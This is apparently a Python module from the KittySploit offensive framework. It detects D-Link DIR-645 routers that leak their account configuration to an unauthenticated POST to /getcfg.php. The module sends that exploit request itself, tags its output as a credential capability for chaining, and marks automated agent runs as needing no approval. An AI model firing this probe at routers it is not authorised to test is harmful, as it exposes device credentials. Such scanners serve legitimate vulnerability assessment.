#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DIR-645 getcfg.php authentication bypass / account disclosure."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'D-Link DIR-645 - getcfg.php Auth Bypass Detection',
        'description': (
            'Detects DIR-645 unauthenticated DEVICE.ACCOUNT disclosure via '
            'POST /getcfg.php SERVICES=DEVICE.ACCOUNT.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'dlink', 'router', 'auth-bypass', 'info-disclosure', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'credential', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/27283',
        ],
    }

    def run(self):
        r = self.http_request(
            method='POST',
            path='/getcfg.php',
            data='SERVICES=DEVICE.ACCOUNT',
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            allow_redirects=False,
        )
        if not r:
            return False
        body = r.text or ''
        if '>DEVICE.ACCOUNT<' in body and 'name>DIR-' in body:
            self.set_info(
                severity='critical',
                reason='D-Link DIR-645 getcfg.php account disclosure',
                path='/getcfg.php',
            )
            return True
        return False
